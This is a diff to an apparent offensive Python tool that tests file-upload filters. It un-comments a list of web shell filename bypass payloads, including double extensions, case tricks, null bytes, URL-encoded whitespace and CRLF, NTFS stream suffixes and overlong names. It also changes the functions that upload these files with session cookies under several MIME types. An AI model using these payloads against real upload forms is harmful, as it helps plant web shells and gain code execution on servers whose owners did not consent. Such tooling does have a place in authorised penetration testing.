@@ -3,7 +3,7 @@ import os
 import subprocess
 import shutil
 
-def load_mime_types(file_path="content_type_small.txt"):
+def load_mime_types(file_path):
     """ Load MIME types from a file. """
     try:
         with open(file_path, "r") as f:
@@ -37,21 +37,21 @@ def create_payloads():
     payloads = [
         "shell.php.jpg",
         "shell.php.png",   
-        # "shell.pHp5",
-        # "shell.png.php",
-        # "shell.php#.png",
-        # "shell.php%20",
-        # "shell.phpJunk123png",
-        # "shell.png.jpg.php",
-        # "shell.php%00.png",
-        # "shell.php...",
-        # "shell.php.png",
-        # "shell.asp::$data",
-        # "A" * 232 + ".php",
-        # "shell.php%0a",
-        # "shell.php%00",
-        # "shell.php%0d%0a",
-        # "shell.php%00.png%00.jpg"
+        "shell.pHp5",
+        "shell.png.php",
+        "shell.php#.png",
+        "shell.php%20",
+        "shell.phpJunk123png",
+        "shell.png.jpg.php",
+        "shell.php%00.png",
+        "shell.php...",
+        "shell.php.png",
+        "shell.asp::$data",
+        "A" * 232 + ".php",
+        "shell.php%0a",
+        "shell.php%00",
+        "shell.php%0d%0a",
+        "shell.php%00.png%00.jpg"
     ]
 
     created_files = []
@@ -110,7 +110,7 @@ def create_payloads():
 #     return False
 
 
-def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_file="content_type_small.txt"):
+def upload_file(payload_filename, upload_url, cookie, form_details, mime_types_file):
     """
     Attempt to upload a file using multiple MIME types.
     """
